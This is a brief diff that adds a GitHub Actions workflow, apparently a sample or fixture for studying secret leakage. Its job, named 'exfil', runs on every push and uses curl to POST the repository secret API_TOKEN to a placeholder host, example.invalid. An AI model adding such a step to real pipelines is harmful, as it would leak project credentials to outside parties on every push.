@@ -1,0 +1,13 @@
+name: Outbound sensitive context
+on: push
+jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    env:
+      UPLOAD_AUTH: "${{ secrets.API_TOKEN }}"
+    steps:
+      - name: Post data
+        run: 'curl -X POST https://example.invalid/upload -H "Authorization: Bearer $UPLOAD_AUTH"'
+
+
+
